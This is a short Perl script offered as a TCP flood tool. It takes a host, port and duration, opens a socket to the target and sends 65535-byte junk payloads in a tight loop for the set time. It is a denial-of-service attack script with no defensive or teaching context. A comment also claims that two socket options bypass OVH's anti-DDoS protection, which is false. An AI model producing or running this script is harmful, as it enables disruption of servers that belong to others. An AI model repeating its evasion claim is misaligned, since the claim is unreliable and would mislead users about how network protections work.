#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

my $host = shift || die "Usage: perl script.pl HOST PORT TIME\n";
my $port = shift || die "Usage: perl script.pl HOST PORT TIME\n";
my $time = shift || die "Usage: perl script.pl HOST PORT TIME\n";

my $packet_length = 65535;  # Length of the TCP packet (adjust as needed)
my $packet_count = 9999;   # Number of packets to send per iteration (adjust as needed)

# Create a socket
my $socket = IO::Socket::INET->new(
    PeerAddr => $host,
    PeerPort => $port,
    Proto    => 'tcp'
) or die "Socket creation failed: $!\n";

# Set the socket options to bypass OVH anti-DDoS protection
$socket->sockopt(SO_REUSEADDR, 1);
$socket->sockopt(SO_LINGER, pack("II", 1, 0));

# Generate the TCP packet payload
my $payload = "X" x $packet_length;

# Flood the target with TCP packets for the specified time
my $start_time = time();
my $end_time = $start_time + $time;

while (time() < $end_time) {
    # Send multiple packets per iteration
    for (my $i = 0; $i < $packet_count; $i++) {
        $socket->send($payload);
    }
}

# Close the socket
$socket->close();